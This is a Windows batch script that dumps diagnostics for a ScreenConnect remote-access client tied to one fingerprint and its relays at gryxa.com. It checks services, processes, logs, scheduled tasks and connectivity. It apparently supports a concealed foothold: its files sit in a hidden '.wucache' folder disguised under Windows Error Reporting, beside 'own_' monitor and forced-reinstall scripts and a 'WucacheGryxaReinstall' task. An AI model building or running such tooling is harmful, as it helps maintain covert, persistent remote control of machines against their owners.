@echo off
rem GRYXA_DIAG BUILD 20260804D1 - one-shot connect-drop dump (sevrz-safe)
setlocal EnableExtensions EnableDelayedExpansion
set "WD=%~1"
if "%WD%"=="" set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "OUT=%WD%\gryxa_diag.txt"
set "FP=36e506ff016b2151"
set "KEEP=5f6010579852e507"
set "ALT=f861c8140d453427"
set "SVC=ScreenConnect Client (%FP%)"
set "STAGE=%SystemRoot%\Temp\.upd"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
> "%OUT%" echo ===== GRYXA DIAG %DATE% %TIME% host=%COMPUTERNAME% =====

>>"%OUT%" echo.
>>"%OUT%" echo --- builds ---
findstr /C:"MONVER=" /C:"OWN_MON  BUILD" "%WD%\own_mon.cmd" >>"%OUT%" 2>nul
findstr /C:"OWN_LIB  BUILD" "%WD%\own_lib.ps1" >>"%OUT%" 2>nul
findstr /C:"OWN_GRYXA BUILD" "%WD%\own_gryxa.cmd" >>"%OUT%" 2>nul
findstr /C:"OWN_GRYXA_FORCE BUILD" "%WD%\own_gryxa_force.cmd" >>"%OUT%" 2>nul

>>"%OUT%" echo.
>>"%OUT%" echo --- all ScreenConnect services ---
sc query state= all | findstr /C:"ScreenConnect Client" >>"%OUT%" 2>nul

>>"%OUT%" echo.
>>"%OUT%" echo --- gryxa svc detail ---
sc query "%SVC%" >>"%OUT%" 2>&1
sc qc "%SVC%" >>"%OUT%" 2>&1

>>"%OUT%" echo.
>>"%OUT%" echo --- ImagePath all SC ---
for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
  set "_FP=%%a"
  set "_FP=!_FP: =!"
  >>"%OUT%" echo FP=!_FP!
  reg query "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (!_FP!)" /v ImagePath >>"%OUT%" 2>&1
)

>>"%OUT%" echo.
>>"%OUT%" echo --- dirs ---
dir /b "%ProgramFiles(x86)%\ScreenConnect Client*" >>"%OUT%" 2>nul
dir /b "%ProgramFiles%\ScreenConnect Client*" >>"%OUT%" 2>nul

>>"%OUT%" echo.
>>"%OUT%" echo --- processes ---
tasklist /FI "IMAGENAME eq ScreenConnect.ClientService.exe" >>"%OUT%" 2>nul
tasklist /FI "IMAGENAME eq ScreenConnect.WindowsClient.exe" >>"%OUT%" 2>nul
tasklist /FI "IMAGENAME eq msiexec.exe" >>"%OUT%" 2>nul

>>"%OUT%" echo.
>>"%OUT%" echo --- locks / results ---
if exist "%WD%\gryxa_msi.lock" (>>"%OUT%" echo LOCK=present & dir "%WD%\gryxa_msi.lock" >>"%OUT%") else (>>"%OUT%" echo LOCK=absent)
if exist "%WD%\gryxa_install.result" (>>"%OUT%" echo RESULT= & type "%WD%\gryxa_install.result" >>"%OUT%") else (>>"%OUT%" echo RESULT=absent)
if exist "%WD%\gryxa.cfg" (>>"%OUT%" echo CFG= & type "%WD%\gryxa.cfg" >>"%OUT%") else (>>"%OUT%" echo CFG=absent)

>>"%OUT%" echo.
>>"%OUT%" echo --- mon log tail (gryxa/msiexec/force) ---
if exist "%WD%\own_mon.log" powershell -NoP -C "Get-Content -LiteralPath '%WD%\own_mon.log' -Tail 40" >>"%OUT%" 2>nul

>>"%OUT%" echo.
>>"%OUT%" echo --- own_gryxa.log tail ---
if exist "%WD%\own_gryxa.log" powershell -NoP -C "Get-Content -LiteralPath '%WD%\own_gryxa.log' -Tail 40" >>"%OUT%" 2>nul

>>"%OUT%" echo.
>>"%OUT%" echo --- own_gryxa_force.log tail ---
if exist "%WD%\own_gryxa_force.log" powershell -NoP -C "Get-Content -LiteralPath '%WD%\own_gryxa_force.log' -Tail 30" >>"%OUT%" 2>nul

>>"%OUT%" echo.
>>"%OUT%" echo --- TCP relay/ui ---
powershell -NoP -C "foreach($h in @('update.gryxa.com','ui.gryxa.com')){ try{ $r=Test-NetConnection $h -Port 443 -WarningAction SilentlyContinue; \"$h tcp=443 TcpTestSucceeded=$($r.TcpTestSucceeded)\" } catch { \"$h ERR\" } }" >>"%OUT%" 2>nul

>>"%OUT%" echo.
>>"%OUT%" echo --- schtasks ---
schtasks /Query /TN WucacheGryxaReinstall >>"%OUT%" 2>&1
schtasks /Query /FO LIST | findstr /I "Wucache Gryxa own_mon etl" >>"%OUT%" 2>nul

>>"%OUT%" echo.
>>"%OUT%" echo --- App log ScreenConnect last 15m ---
powershell -NoP -C "$s=(Get-Date).AddMinutes(-15); Get-WinEvent -FilterHashtable @{LogName='Application'; StartTime=$s} -EA 0 | ?{ $_.ProviderName -match 'ScreenConnect|MsiInstaller' -or $_.Message -match 'ScreenConnect|36e506ff' } | Select-Object -First 25 TimeCreated,ProviderName,Id,LevelDisplayName,@{n='Msg';e={$_.Message.Substring(0,[Math]::Min(180,$_.Message.Length))}} | Format-List" >>"%OUT%" 2>nul

>>"%OUT%" echo.
>>"%OUT%" echo ===== END DIAG =====
echo WROTE %OUT%
echo --- preview ---
powershell -NoP -C "Get-Content -LiteralPath '%OUT%' -TotalCount 80"
endlocal
